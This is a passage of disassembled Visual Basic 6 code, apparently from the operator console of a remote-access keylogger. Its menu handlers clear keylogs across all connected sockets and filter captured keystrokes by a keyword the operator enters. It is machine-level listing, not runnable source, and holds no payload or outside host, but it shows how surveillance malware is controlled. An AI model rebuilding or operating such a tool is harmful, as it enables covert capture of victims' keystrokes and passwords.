0074D4B5: push 008F2010h
0074D4BA: push 00433984h
0074D4BF: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074D4C4: mov var_000001C8, 008F2010h
0074D4CE: jmp 74D4DAh
0074D4D0: mov var_000001C8, 008F2010h
0074D4DA: push 00000000h
0074D4DC: push 00000001h
0074D4DE: push 00440E48h
0074D4E3: push 00000000h
0074D4E5: push 00000018h
0074D4E7: mov eax, var_000001C8
0074D4ED: mov eax, [eax]
0074D4EF: mov ecx, var_000001C8
0074D4F5: mov ecx, [ecx]
0074D4F7: mov ecx, [ecx]
0074D4F9: push eax
0074D4FA: call [ecx+00000550h]
0074D500: push eax
0074D501: lea eax, var_4C
0074D504: push eax
0074D505: call 00410A84h ; Set (object)
0074D50A: push eax
0074D50B: lea eax, var_64
0074D50E: push eax
0074D50F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D514: add esp, 00000010h
0074D517: push eax
0074D518: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074D51D: push eax
0074D51E: lea eax, var_50
0074D521: push eax
0074D522: call 00410A84h ; Set (object)
0074D527: push eax
0074D528: lea eax, var_74
0074D52B: push eax
0074D52C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D531: add esp, 00000010h
0074D534: push eax
0074D535: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0074D53A: mov var_000000E0, eax
0074D540: mov var_000000E8, 00000003h
0074D54A: mov var_000000F0, 00000001h
0074D554: mov var_000000F8, 00000002h
0074D55E: lea eax, var_000000D8
0074D564: push eax
0074D565: lea eax, var_000000E8
0074D56B: push eax
0074D56C: lea eax, var_000000F8
0074D572: push eax
0074D573: lea eax, var_00000198
0074D579: push eax
0074D57A: lea eax, var_00000188
0074D580: push eax
0074D581: lea eax, var_30
0074D584: push eax
0074D585: call 00410A3Ch ; For
0074D58A: mov var_000001B4, eax
0074D590: lea eax, var_50
0074D593: push eax
0074D594: lea eax, var_4C
0074D597: push eax
0074D598: push 00000002h
0074D59A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074D59F: add esp, 0000000Ch
0074D5A2: lea eax, var_74
0074D5A5: push eax
0074D5A6: lea eax, var_64
0074D5A9: push eax
0074D5AA: push 00000002h
0074D5AC: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074D5B1: add esp, 0000000Ch
0074D5B4: jmp 0074D90Fh
0074D5B9: mov var_04, 00000017h
0074D5C0: lea eax, var_30
0074D5C3: mov var_000000D0, eax
0074D5C9: mov var_000000D8, 0000400Ch
0074D5D3: cmp [008F2010h], 00000000h
0074D5DA: jnz 74D5F7h
0074D5DC: push 008F2010h
0074D5E1: push 00433984h
0074D5E6: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074D5EB: mov var_000001CC, 008F2010h
0074D5F5: jmp 74D601h
0074D5F7: mov var_000001CC, 008F2010h
0074D601: push 00000000h
0074D603: push 00000004h
0074D605: push 00440E58h
0074D60A: push 00000010h
0074D60C: pop eax
0074D60D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074D612: lea esi, var_000000D8
0074D618: mov edi, esp
0074D61A: movsd 
0074D61B: movsd 
0074D61C: movsd 
0074D61D: movsd 
0074D61E: push 00000001h
0074D620: push 00000000h
0074D622: push 00440E48h
0074D627: push 00000000h
0074D629: push 00000018h
0074D62B: mov eax, var_000001CC
0074D631: mov eax, [eax]
0074D633: mov ecx, var_000001CC
0074D639: mov ecx, [ecx]
0074D63B: mov ecx, [ecx]
0074D63D: push eax
0074D63E: call [ecx+00000550h]
0074D644: push eax
0074D645: lea eax, var_4C
0074D648: push eax
0074D649: call 00410A84h ; Set (object)
0074D64E: push eax
0074D64F: lea eax, var_64
0074D652: push eax
0074D653: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D658: add esp, 00000010h
0074D65B: push eax
0074D65C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074D661: push eax
0074D662: lea eax, var_50
0074D665: push eax
0074D666: call 00410A84h ; Set (object)
0074D66B: push eax
0074D66C: lea eax, var_74
0074D66F: push eax
0074D670: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D675: add esp, 00000020h
0074D678: push eax
0074D679: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074D67E: push eax
0074D67F: lea eax, var_54
0074D682: push eax
0074D683: call 00410A84h ; Set (object)
0074D688: push eax
0074D689: lea eax, var_00000084
0074D68F: push eax
0074D690: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D695: add esp, 00000010h
0074D698: push eax
0074D699: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0074D69E: sub ax, FFFFh
0074D6A2: neg ax
0074D6A5: sbb eax, eax
0074D6A7: inc eax
0074D6A8: neg eax
0074D6AA: mov var_00000148, ax
0074D6B1: lea eax, var_54
0074D6B4: push eax
0074D6B5: lea eax, var_50
0074D6B8: push eax
0074D6B9: lea eax, var_4C
0074D6BC: push eax
0074D6BD: push 00000003h
0074D6BF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074D6C4: add esp, 00000010h
0074D6C7: lea eax, var_00000084
0074D6CD: push eax
0074D6CE: lea eax, var_74
0074D6D1: push eax
0074D6D2: lea eax, var_64
0074D6D5: push eax
0074D6D6: push 00000003h
0074D6D8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074D6DD: add esp, 00000010h
0074D6E0: movsx eax, word ptr var_00000148
0074D6E7: test eax, eax
0074D6E9: jz 0074D8EBh
0074D6EF: mov var_04, 00000018h
0074D6F6: lea eax, var_30
0074D6F9: mov var_000000D0, eax
0074D6FF: mov var_000000D8, 0000400Ch
0074D709: cmp [008F2010h], 00000000h
0074D710: jnz 74D72Dh
0074D712: push 008F2010h
0074D717: push 00433984h
0074D71C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074D721: mov var_000001D0, 008F2010h
0074D72B: jmp 74D737h
0074D72D: mov var_000001D0, 008F2010h
0074D737: push 00000000h
0074D739: push 00000014h
0074D73B: push 00440E58h
0074D740: push 00000010h
0074D742: pop eax
0074D743: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074D748: lea esi, var_000000D8
0074D74E: mov edi, esp
0074D750: movsd 
0074D751: movsd 
0074D752: movsd 
0074D753: movsd 
0074D754: push 00000001h
0074D756: push 00000000h
0074D758: push 00440E48h
0074D75D: push 00000000h
0074D75F: push 00000018h
0074D761: mov eax, var_000001D0
0074D767: mov eax, [eax]
0074D769: mov ecx, var_000001D0
0074D76F: mov ecx, [ecx]
0074D771: mov ecx, [ecx]
0074D773: push eax
0074D774: call [ecx+00000550h]
0074D77A: push eax
0074D77B: lea eax, var_4C
0074D77E: push eax
0074D77F: call 00410A84h ; Set (object)
0074D784: push eax
0074D785: lea eax, var_64
0074D788: push eax
0074D789: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D78E: add esp, 00000010h
0074D791: push eax
0074D792: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074D797: push eax
0074D798: lea eax, var_50
0074D79B: push eax
0074D79C: call 00410A84h ; Set (object)
0074D7A1: push eax
0074D7A2: lea eax, var_74
0074D7A5: push eax
0074D7A6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D7AB: add esp, 00000020h
0074D7AE: push eax
0074D7AF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074D7B4: push eax
0074D7B5: lea eax, var_54
0074D7B8: push eax
0074D7B9: call 00410A84h ; Set (object)
0074D7BE: push eax
0074D7BF: lea eax, var_00000084
0074D7C5: push eax
0074D7C6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074D7CB: add esp, 00000010h
0074D7CE: push eax
0074D7CF: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0074D7D4: mov edx, eax
0074D7D6: lea ecx, var_38
0074D7D9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074D7DE: push eax
0074D7DF: call 004109DCh ; Val(arg_1)
0074D7E4: fstp real8 ptr var_00000144
0074D7EA: push 00000000h
0074D7EC: push 00000001h
0074D7EE: push 00000001h
0074D7F0: push 00000000h
0074D7F2: lea eax, var_000000C8
0074D7F8: push eax
0074D7F9: push 00000010h
0074D7FB: push 00000880h
0074D800: call 00410946h ; ReDim
0074D805: add esp, 0000001Ch
0074D808: mov var_000000E0, 008F23B4h
0074D812: mov var_000000E8, 00004008h
0074D81C: lea esi, var_000000E8
0074D822: push 00000000h
0074D824: push var_000000C8
0074D82A: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074D82F: mov ecx, eax
0074D831: mov edx, esi
0074D833: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074D838: lea eax, var_34
0074D83B: mov var_000000F0, eax
0074D841: mov var_000000F8, 00004003h
0074D84B: lea esi, var_000000F8
0074D851: push 00000001h
0074D853: push var_000000C8
0074D859: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074D85E: mov ecx, eax
0074D860: mov edx, esi
0074D862: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074D867: mov edx, 0043D54Ch ; x26
0074D86C: lea ecx, var_3C
0074D86F: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074D874: lea eax, var_000000C8
0074D87A: push eax
0074D87B: lea eax, var_3C
0074D87E: push eax
0074D87F: fld real8 ptr var_00000144
0074D885: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0074D88A: push eax
0074D88B: call 007A6910h
0074D890: lea eax, var_000000C8
0074D896: push eax
0074D897: push 00000000h
0074D899: call 00410934h ; Erase
0074D89E: lea eax, var_3C
0074D8A1: push eax
0074D8A2: lea eax, var_38
0074D8A5: push eax
0074D8A6: push 00000002h
0074D8A8: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074D8AD: add esp, 0000000Ch
0074D8B0: lea eax, var_54
0074D8B3: push eax
0074D8B4: lea eax, var_50
0074D8B7: push eax
0074D8B8: lea eax, var_4C
0074D8BB: push eax
0074D8BC: push 00000003h
0074D8BE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074D8C3: add esp, 00000010h
0074D8C6: lea eax, var_00000084
0074D8CC: push eax
0074D8CD: lea eax, var_74
0074D8D0: push eax
0074D8D1: lea eax, var_64
0074D8D4: push eax
0074D8D5: push 00000003h
0074D8D7: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074D8DC: add esp, 00000010h
0074D8DF: mov var_04, 00000019h
0074D8E6: call 0041096Ah ; DoEvents
0074D8EB: mov var_04, 0000001Bh
0074D8F2: lea eax, var_00000198
0074D8F8: push eax
0074D8F9: lea eax, var_00000188
0074D8FF: push eax
0074D900: lea eax, var_30
0074D903: push eax
0074D904: call 00410A36h ; Next
0074D909: mov var_000001B4, eax
0074D90F: cmp var_000001B4, 00000000h
0074D916: jnz 0074D5B9h
0074D91C: mov var_10, 00000000h
0074D923: wait 
0074D924: push 0074D9D2h
0074D929: jmp 74D9A3h
0074D92B: lea eax, var_48
0074D92E: push eax
0074D92F: lea eax, var_44
0074D932: push eax
0074D933: lea eax, var_40
0074D936: push eax
0074D937: lea eax, var_3C
0074D93A: push eax
0074D93B: lea eax, var_38
0074D93E: push eax
0074D93F: push 00000005h
0074D941: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074D946: add esp, 00000018h
0074D949: lea eax, var_54
0074D94C: push eax
0074D94D: lea eax, var_50
0074D950: push eax
0074D951: lea eax, var_4C
0074D954: push eax
0074D955: push 00000003h
0074D957: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074D95C: add esp, 00000010h
0074D95F: lea eax, var_000000C4
0074D965: push eax
0074D966: lea eax, var_000000B4
0074D96C: push eax
0074D96D: lea eax, var_000000A4
0074D973: push eax
0074D974: lea eax, var_00000094
0074D97A: push eax
0074D97B: lea eax, var_00000084
0074D981: push eax
0074D982: lea eax, var_74
0074D985: push eax
0074D986: lea eax, var_64
0074D989: push eax
0074D98A: push 00000007h
0074D98C: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074D991: add esp, 00000020h
0074D994: lea eax, var_000000C8
0074D99A: push eax
0074D99B: push 00000000h
0074D99D: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074D9A2: ret 
End Sub

Private sub mnuRensaLoggAlla__74E4B5
0074E4B5: push ebp
0074E4B6: mov ebp, esp
0074E4B8: sub esp, 00000018h
0074E4BB: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074E4C0: mov eax, fs:[00h]
0074E4C6: push eax
0074E4C7: mov fs:[00000000h], esp
0074E4CE: mov eax, 000000E8h
0074E4D3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074E4D8: push ebx
0074E4D9: push esi
0074E4DA: push edi
0074E4DB: mov var_18, esp
0074E4DE: mov var_14, 00405DB0h
0074E4E5: mov eax, [ebp+08h]
0074E4E8: and eax, 00000001h
0074E4EB: mov var_10, eax
0074E4EE: mov eax, [ebp+08h]
0074E4F1: and al, FEh
0074E4F3: mov [ebp+08h], eax
0074E4F6: mov var_0C, 00000000h
0074E4FD: mov eax, [ebp+08h]
0074E500: mov eax, [eax]
0074E502: push [ebp+08h]
0074E505: call [eax+04h]
0074E508: mov var_04, 00000001h
0074E50F: mov var_04, 00000002h
0074E516: push FFFFFFFFh
0074E518: call 00410A60h ; On Error ...
0074E51D: mov var_04, 00000003h
0074E524: mov var_70, 80020004h
0074E52B: mov var_78, 0000000Ah
0074E532: mov var_60, 80020004h
0074E539: mov var_68, 0000000Ah
0074E540: mov var_50, 80020004h
0074E547: mov var_58, 0000000Ah
0074E54E: mov var_00000084, 0044BCB4h ; Confirm erasing
0074E558: mov var_0000008C, 00000008h
0074E562: lea edx, var_0000008C
0074E568: lea ecx, var_48
0074E56B: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074E570: lea eax, var_78
0074E573: push eax
0074E574: lea eax, var_68
0074E577: push eax
0074E578: lea eax, var_58
0074E57B: push eax
0074E57C: push 00000034h
0074E57E: lea eax, var_48
0074E581: push eax
0074E582: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
0074E587: sub eax, 00000007h
0074E58A: neg eax
0074E58C: sbb eax, eax
0074E58E: inc eax
0074E58F: neg eax
0074E591: mov var_000000C4, ax
0074E598: lea eax, var_78
0074E59B: push eax
0074E59C: lea eax, var_68
0074E59F: push eax
0074E5A0: lea eax, var_58
0074E5A3: push eax
0074E5A4: lea eax, var_48
0074E5A7: push eax
0074E5A8: push 00000004h
0074E5AA: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074E5AF: add esp, 00000014h
0074E5B2: movsx eax, word ptr var_000000C4
0074E5B9: test eax, eax
0074E5BB: jz 74E5C2h
0074E5BD: jmp 0074E7D2h
0074E5C2: mov var_04, 00000006h
0074E5C9: push 00FF00FFh
0074E5CE: push 0044BCD8h ; Delete log - All sockets
0074E5D3: push 00442864h ; Keylog
0074E5D8: push 00443C28h
0074E5DD: call 0074FC42h
0074E5E2: mov var_04, 00000007h
0074E5E9: mov var_00000084, 00000001h
0074E5F3: mov var_0000008C, 00000002h
0074E5FD: cmp [008F2010h], 00000000h
0074E604: jnz 74E621h
0074E606: push 008F2010h
0074E60B: push 00433984h
0074E610: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074E615: mov var_00000104, 008F2010h
0074E61F: jmp 74E62Bh
0074E621: mov var_00000104, 008F2010h
0074E62B: mov eax, var_00000104
0074E631: mov eax, [eax]
0074E633: mov ecx, var_00000104
0074E639: mov ecx, [ecx]
0074E63B: mov ecx, [ecx]
0074E63D: push eax
0074E63E: call [ecx+00000524h]
0074E644: push eax
0074E645: lea eax, var_38
0074E648: push eax
0074E649: call 00410A84h ; Set (object)
0074E64E: mov var_000000C4, eax
0074E654: lea eax, var_000000C0
0074E65A: push eax
0074E65B: mov eax, var_000000C4
0074E661: mov eax, [eax]
0074E663: push var_000000C4
0074E669: call [eax+48h]
0074E66C: fclex 
0074E66E: mov var_000000C8, eax
0074E674: cmp var_000000C8, 00000000h
0074E67B: jnl 74E69Dh
0074E67D: push 00000048h
0074E67F: push 00440DE8h
0074E684: push var_000000C4
0074E68A: push var_000000C8
0074E690: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074E695: mov var_00000108, eax
0074E69B: jmp 74E6A4h
0074E69D: and var_00000108, 00000000h
0074E6A4: mov ax, var_000000C0
0074E6AB: mov var_00000094, ax
0074E6B2: mov var_0000009C, 00000002h
0074E6BC: mov var_000000A4, 00000001h
0074E6C6: mov var_000000AC, 00000002h
0074E6D0: lea eax, var_0000008C
0074E6D6: push eax
0074E6D7: lea eax, var_0000009C
0074E6DD: push eax
0074E6DE: lea eax, var_000000AC
0074E6E4: push eax
0074E6E5: lea eax, var_000000E8
0074E6EB: push eax
0074E6EC: lea eax, var_000000D8
0074E6F2: push eax
0074E6F3: lea eax, var_30
0074E6F6: push eax
0074E6F7: call 00410A3Ch ; For
0074E6FC: mov var_00000100, eax
0074E702: lea ecx, var_38
0074E705: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0074E70A: jmp 0074E7C5h
0074E70F: mov var_04, 00000008h
0074E716: push 00000000h
0074E718: push 00000000h
0074E71A: push 00000001h
0074E71C: push 00000000h
0074E71E: lea eax, var_7C
0074E721: push eax
0074E722: push 00000010h
0074E724: push 00000880h
0074E729: call 00410946h ; ReDim
0074E72E: add esp, 0000001Ch
0074E731: mov var_00000084, 00442930h
0074E73B: mov var_0000008C, 00000008h
0074E745: lea esi, var_0000008C
0074E74B: push 00000000h
0074E74D: push var_7C
0074E750: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074E755: mov ecx, eax
0074E757: mov edx, esi
0074E759: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074E75E: mov edx, 0043D564h ; x28
0074E763: lea ecx, var_34
0074E766: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074E76B: lea eax, var_7C
0074E76E: push eax
0074E76F: lea eax, var_34
0074E772: push eax
0074E773: lea eax, var_30
0074E776: push eax
0074E777: call 004109D0h ; msvbvm60.dll.__vbaI2Var
0074E77C: push eax
0074E77D: call 007A6910h
0074E782: lea eax, var_7C
0074E785: push eax
0074E786: push 00000000h
0074E788: call 00410934h ; Erase
0074E78D: lea ecx, var_34
0074E790: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074E795: mov var_04, 00000009h
0074E79C: call 0041096Ah ; DoEvents
0074E7A1: mov var_04, 0000000Ah
0074E7A8: lea eax, var_000000E8
0074E7AE: push eax
0074E7AF: lea eax, var_000000D8
0074E7B5: push eax
0074E7B6: lea eax, var_30
0074E7B9: push eax
0074E7BA: call 00410A36h ; Next
0074E7BF: mov var_00000100, eax
0074E7C5: cmp var_00000100, 00000000h
0074E7CC: jnz 0074E70Fh
0074E7D2: mov var_10, 00000000h
0074E7D9: push 0074E837h
0074E7DE: jmp 74E816h
0074E7E0: lea ecx, var_34
0074E7E3: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074E7E8: lea ecx, var_38
0074E7EB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0074E7F0: lea eax, var_78
0074E7F3: push eax
0074E7F4: lea eax, var_68
0074E7F7: push eax
0074E7F8: lea eax, var_58
0074E7FB: push eax
0074E7FC: lea eax, var_48
0074E7FF: push eax
0074E800: push 00000004h
0074E802: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074E807: add esp, 00000014h
0074E80A: lea eax, var_7C
0074E80D: push eax
0074E80E: push 00000000h
0074E810: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074E815: ret 
End Sub

Private sub mnuFiltreradLoggAlla__74A8F0
0074A8F0: push ebp
0074A8F1: mov ebp, esp
0074A8F3: sub esp, 00000018h
0074A8F6: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074A8FB: mov eax, fs:[00h]
0074A901: push eax
0074A902: mov fs:[00000000h], esp
0074A909: mov eax, 0000010Ch
0074A90E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074A913: push ebx
0074A914: push esi
0074A915: push edi
0074A916: mov var_18, esp
0074A919: mov var_14, 00405A80h
0074A920: mov eax, [ebp+08h]
0074A923: and eax, 00000001h
0074A926: mov var_10, eax
0074A929: mov eax, [ebp+08h]
0074A92C: and al, FEh
0074A92E: mov [ebp+08h], eax
0074A931: mov var_0C, 00000000h
0074A938: mov eax, [ebp+08h]
0074A93B: mov eax, [eax]
0074A93D: push [ebp+08h]
0074A940: call [eax+04h]
0074A943: mov var_04, 00000001h
0074A94A: mov var_04, 00000002h
0074A951: push FFFFFFFFh
0074A953: call 00410A60h ; On Error ...
0074A958: mov var_04, 00000003h
0074A95F: mov var_00000090, 80020004h
0074A969: mov var_00000098, 0000000Ah
0074A973: mov var_80, 80020004h
0074A97A: mov var_00000088, 0000000Ah
0074A984: mov var_70, 80020004h
0074A98B: mov var_78, 0000000Ah
0074A992: mov var_60, 80020004h
0074A999: mov var_68, 0000000Ah
0074A9A0: mov var_50, 80020004h
0074A9A7: mov var_58, 0000000Ah
0074A9AE: mov var_000000B0, 0044BA4Ch ; Filtered keylog
0074A9B8: mov var_000000B8, 00000008h
0074A9C2: lea edx, var_000000B8
0074A9C8: lea ecx, var_48
0074A9CB: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074A9D0: mov var_000000A0, 0044BA38h ; Keyword
0074A9DA: mov var_000000A8, 00000008h
0074A9E4: lea edx, var_000000A8
0074A9EA: lea ecx, var_38
0074A9ED: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074A9F2: lea eax, var_00000098
0074A9F8: push eax
0074A9F9: lea eax, var_00000088
0074A9FF: push eax
0074AA00: lea eax, var_78
0074AA03: push eax
0074AA04: lea eax, var_68
0074AA07: push eax
0074AA08: lea eax, var_58
0074AA0B: push eax
0074AA0C: lea eax, var_48
0074AA0F: push eax
0074AA10: lea eax, var_38
0074AA13: push eax
0074AA14: call 00410994h ; InputBox
0074AA19: mov edx, eax
0074AA1B: mov ecx, 008F23B4h
0074AA20: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074AA25: lea eax, var_00000098
0074AA2B: push eax
0074AA2C: lea eax, var_00000088
0074AA32: push eax
0074AA33: lea eax, var_78
0074AA36: push eax
0074AA37: lea eax, var_68
0074AA3A: push eax
0074AA3B: lea eax, var_58
0074AA3E: push eax
0074AA3F: lea eax, var_48
0074AA42: push eax
0074AA43: lea eax, var_38
0074AA46: push eax
0074AA47: push 00000007h
0074AA49: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074AA4E: add esp, 00000020h
0074AA51: mov var_04, 00000004h
0074AA58: mov var_00000090, 80020004h
0074AA62: mov var_00000098, 0000000Ah
0074AA6C: mov var_80, 80020004h
0074AA73: mov var_00000088, 0000000Ah
0074AA7D: mov var_70, 80020004h
0074AA84: mov var_78, 0000000Ah
0074AA8B: mov var_60, 80020004h
0074AA92: mov var_68, 0000000Ah
0074AA99: mov var_50, 80020004h
0074AAA0: mov var_58, 0000000Ah
0074AAA7: mov var_000000B0, 0044BA4Ch ; Filtered keylog
0074AAB1: mov var_000000B8, 00000008h
0074AABB: lea edx, var_000000B8
0074AAC1: lea ecx, var_48
0074AAC4: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074AAC9: mov var_000000A0, 0044BA70h ; Total number of charactes to include after the keyword
0074AAD3: mov var_000000A8, 00000008h
0074AADD: lea edx, var_000000A8
0074AAE3: lea ecx, var_38
0074AAE6: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074AAEB: lea eax, var_00000098
0074AAF1: push eax
0074AAF2: lea eax, var_00000088
0074AAF8: push eax
0074AAF9: lea eax, var_78
0074AAFC: push eax
0074AAFD: lea eax, var_68
0074AB00: push eax
0074AB01: lea eax, var_58
0074AB04: push eax
0074AB05: lea eax, var_48
0074AB08: push eax
0074AB09: lea eax, var_38
0074AB0C: push eax
0074AB0D: call 00410994h ; InputBox
0074AB12: mov edx, eax
0074AB14: lea ecx, var_28
0074AB17: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074AB1C: push eax
0074AB1D: call 004109DCh ; Val(arg_1)
0074AB22: call 00410814h ; msvbvm60.dll.__vbaFpI4
0074AB27: mov var_24, eax
0074AB2A: lea ecx, var_28
0074AB2D: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074AB32: lea eax, var_00000098
0074AB38: push eax
0074AB39: lea eax, var_00000088
0074AB3F: push eax
0074AB40: lea eax, var_78
0074AB43: push eax
0074AB44: lea eax, var_68
0074AB47: push eax
0074AB48: lea eax, var_58
0074AB4B: push eax
0074AB4C: lea eax, var_48
0074AB4F: push eax
0074AB50: lea eax, var_38
0074AB53: push eax
0074AB54: push 00000007h
0074AB56: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074AB5B: add esp, 00000020h
0074AB5E: mov var_04, 00000005h
0074AB65: and var_00000110, 00000000h
0074AB6C: lea eax, var_0000010C
0074AB72: push eax
0074AB73: lea eax, var_00000110
0074AB79: push eax
0074AB7A: push var_24
0074AB7D: push [008F23B4h]
0074AB83: mov eax, [ebp+08h]
0074AB86: mov eax, [eax]
0074AB88: push [ebp+08h]
0074AB8B: call [eax+000006FCh]
0074AB91: mov var_00000114, eax
0074AB97: cmp var_00000114, 00000000h
0074AB9E: jnl 74ABC0h
0074ABA0: push 000006FCh
0074ABA5: push 00444BA4h
0074ABAA: push [ebp+08h]
0074ABAD: push var_00000114
0074ABB3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074ABB8: mov var_0000012C, eax
0074ABBE: jmp 74ABC7h
0074ABC0: and var_0000012C, 00000000h
0074ABC7: mov var_10, 00000000h
0074ABCE: wait 
0074ABCF: push 0074AC0Ch
0074ABD4: jmp 74AC0Bh
0074ABD6: lea ecx, var_28
0074ABD9: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074ABDE: lea eax, var_00000098
0074ABE4: push eax
0074ABE5: lea eax, var_00000088
0074ABEB: push eax
0074ABEC: lea eax, var_78
0074ABEF: push eax
0074ABF0: lea eax, var_68
0074ABF3: push eax
0074ABF4: lea eax, var_58
0074ABF7: push eax
0074ABF8: lea eax, var_48
0074ABFB: push eax
0074ABFC: lea eax, var_38
0074ABFF: push eax
0074AC00: push 00000007h
0074AC02: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074AC07: add esp, 00000020h
0074AC0A: ret 
End Sub

Private sub mnuFiltreradLoggNuvarande__74B357
0074B357: push ebp
0074B358: mov ebp, esp
0074B35A: sub esp, 00000018h
0074B35D: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074B362: mov eax, fs:[00h]
0074B368: push eax
0074B369: mov fs:[00000000h], esp
0074B370: mov eax, 0000019Ch
0074B375: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074B37A: push ebx
0074B37B: push esi
0074B37C: push edi
0074B37D: mov var_18, esp
0074B380: mov var_14, 00405B18h
0074B387: mov eax, [ebp+08h]
0074B38A: and eax, 00000001h
0074B38D: mov var_10, eax
0074B390: mov eax, [ebp+08h]
0074B393: and al, FEh
0074B395: mov [ebp+08h], eax
0074B398: mov var_0C, 00000000h
0074B39F: mov eax, [ebp+08h]
0074B3A2: mov eax, [eax]
0074B3A4: push [ebp+08h]
0074B3A7: call [eax+04h]
0074B3AA: mov var_04, 00000001h
0074B3B1: mov var_04, 00000002h
0074B3B8: push FFFFFFFFh
0074B3BA: call 00410A60h ; On Error ...
0074B3BF: mov var_04, 00000003h
0074B3C6: mov var_000000C4, 80020004h
0074B3D0: mov var_000000CC, 0000000Ah
0074B3DA: mov var_000000B4, 80020004h
0074B3E4: mov var_000000BC, 0000000Ah
0074B3EE: mov var_000000A4, 80020004h
0074B3F8: mov var_000000AC, 0000000Ah
0074B402: mov var_00000094, 80020004h
0074B40C: mov var_0000009C, 0000000Ah
0074B416: mov var_00000084, 80020004h
0074B420: mov var_0000008C, 0000000Ah
0074B42A: mov var_000000E8, 0044BA4Ch ; Filtered keylog
0074B434: mov var_000000F0, 00000008h
0074B43E: lea edx, var_000000F0
0074B444: lea ecx, var_7C
0074B447: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074B44C: mov var_000000D8, 0044BA38h ; Keyword
0074B456: mov var_000000E0, 00000008h
0074B460: lea edx, var_000000E0
0074B466: lea ecx, var_6C
0074B469: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074B46E: lea eax, var_000000CC
0074B474: push eax
0074B475: lea eax, var_000000BC
0074B47B: push eax
0074B47C: lea eax, var_000000AC
0074B482: push eax
0074B483: lea eax, var_0000009C
0074B489: push eax
0074B48A: lea eax, var_0000008C
0074B490: push eax
0074B491: lea eax, var_7C
0074B494: push eax
0074B495: lea eax, var_6C
0074B498: push eax
0074B499: call 00410994h ; InputBox
0074B49E: mov edx, eax
0074B4A0: mov ecx, 008F23B4h
0074B4A5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074B4AA: lea eax, var_000000CC
0074B4B0: push eax
0074B4B1: lea eax, var_000000BC
0074B4B7: push eax
0074B4B8: lea eax, var_000000AC
0074B4BE: push eax
0074B4BF: lea eax, var_0000009C
0074B4C5: push eax
0074B4C6: lea eax, var_0000008C
0074B4CC: push eax
0074B4CD: lea eax, var_7C
0074B4D0: push eax
0074B4D1: lea eax, var_6C
0074B4D4: push eax
0074B4D5: push 00000007h
0074B4D7: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074B4DC: add esp, 00000020h
